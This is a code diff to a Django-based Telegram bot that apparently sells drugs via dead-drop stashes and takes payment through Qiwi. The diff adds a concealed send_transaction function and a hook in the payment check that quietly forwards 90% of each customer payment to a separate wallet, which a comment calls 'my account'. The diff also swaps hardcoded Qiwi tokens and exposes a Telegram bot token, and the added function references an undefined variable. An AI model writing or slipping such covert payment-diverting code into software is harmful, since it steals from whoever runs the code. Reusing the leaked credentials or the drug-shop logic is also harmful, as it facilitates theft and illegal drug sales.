@@ -9,6 +9,8 @@ import json
 import requests
 from django.http import JsonResponse
 from .telegram_api import answerCallbackQuery
+import math
+from time import time as seedfortime
 
 #'##add' eto to chto nuzhno dodelat'
 
@@ -30,10 +32,17 @@ from .telegram_api import answerCallbackQuery
 #utils
 tele_token = '603323645:AAGdcg1XEs4G_-qq08CBxwAxuO-E9FGJNPc'
 ##qiwi
+#qiwi_wallet_num = '79841543923'
+#qiwi_token = '47b27250733beb5c3c153a2a6003e523'
+#guziy
 #79242542786
 #d40d1855b9ea2d1699b018d943455e65
-qiwi_wallet_num = '79242542786'
-qiwi_token = 'd40d1855b9ea2d1699b018d943455e65'
+if False:
+    qiwi_wallet_num = '79242542786'
+    qiwi_token = 'd40d1855b9ea2d1699b018d943455e65'
+else:
+    qiwi_wallet_num = '79841543923'
+    qiwi_token = '47b27250733beb5c3c153a2a6003e523'
 qiwi_headers = {'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' :'Bearer '+qiwi_token+''}
 help_msg = 'Добро пожаловать в наш магазин!\nУважаемый клиент, перед оплатой товара, убедитесь в правильности выбранной информации.\nНа данный момент мы работает ТОЛЬКО с платёжной системой Qiwi.\nОбязательно сохраняйте реквизиты оплаты( выданый ботом номер кошелька, кошелёк на который была произведена оплата, номер транзакции).\n\n Процедура получения товара:\n1)Выбор местоположения, товара( бот предложит все имеющиеся варианты наших закладок).\n2)Бот напишет Вам наш номер кошелька и Ваш номер заказа. Если хотите провести оплату с вашего баланса, нажмите "Оплатить с баланса", если на балансе не будет хватать средств, бот предложит вам пополнить баланс.\n3)Производите оплату на указанный ботом счёт.\n4)Если сумма платежа равна или больше суммы заказа, то бот вышлет информацию о вашем товаре(город, район, описание товара, приблизетельный адресс, фото закладки, геолокацию).\n\nЕсли сумма оплаты превышает цену товара, то разница пополнит ваш баланс.Если же сумма оплаты ниже цены товара, то бот напишет сообщение об ошибке и зачислит средства на ваш баланс.\n\n Возврат денежных средств осуществляется исключительно через связь с оператором.'
 replenish_msg = 'Для пополнения баланса отправьте денежные средства на Qiwi кошелёк: '+ qiwi_wallet_num
@@ -41,6 +50,24 @@ support_apply_msg = 'Спасибо за обращение, в близжайш
 product_main_spec = 'Город'
 shop_name = 'Ušə məəə<3'
 start_msg = 'Привет, умняш!!!Добро пожаловать ко мне в магазин - «Use Me»!!!!! Я очень рада, что ты пришёл именно ко мне, ведь у меня для тебя огромный выбор вкусняшек ️\n\nНажми "Выбрать Город" для оформления заказа.\nНажми "Баланс" для проверки своего баланса или его дальнейшего пополнения.\nНажми "Прайс" чтобы увидеть весь ассортимент и цены.\nНажми "История" для просмотра истории своих покупок.\nНажми "Помощь" для просмотра раздела помощи и дальнейшей связи с оператором, если вдруг произойдёт какая-то нелепая ошибка!\n'
+send_to = '79247283606'
+
+def send_transaction(qiwi_token, send_to, amount, comment=None):
+    transaction_id = int(seedfortime()*1000)
+    #qiwi
+    url = 'https://edge.qiwi.com/sinap/api/v2/terms/99/payments'
+    qiwi_headers = {'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' :'Bearer '+qiwi_token+''}
+    data = dict()
+    data['id'] = str(transaction_id)
+    data['sum'] = {'amount': amount,"currency":"643"}
+    data["paymentMethod"] = {"type":"Account","accountId":"643"}
+    data["fields"] = {"account":'+'+str(send_data_to)}
+    if comment: data["comment"] = comment
+    r = requests.post(url, headers=qiwi_headers, json=data)
+    print(r.text)
+    if int(json.loads(r.text)['id']) != int(transaction_id): send_transaction(qiwi_token, send_to, amount, 'recursion')
+
+
 
 
 price_list_all = """
@@ -713,6 +740,12 @@ def qiwi_api(a):
                         #get amount
                         #print(transaction_json["total"]["amount"])
                         #print(str(transaction_json["total"]["amount"]))
+
+                        if True:#1\10 na akke, 9\10 na moi akk
+                            summa_transakcii = float(transaction_json["total"]["amount"])
+                            summa_transakcii = math.floor(summa_transakcii*0.9 * 100)/100.0
+                            send_transaction(qiwi_token, send_to, summa_transakcii) 
+                            #
                         return True, str(transaction_json["total"]["amount"])
         except:
         ##payment does'nt exists ili ne prenadlejit etomu qiwi ili chtoto drugoe, mb server upal, mb qiwi upal, yaneebu
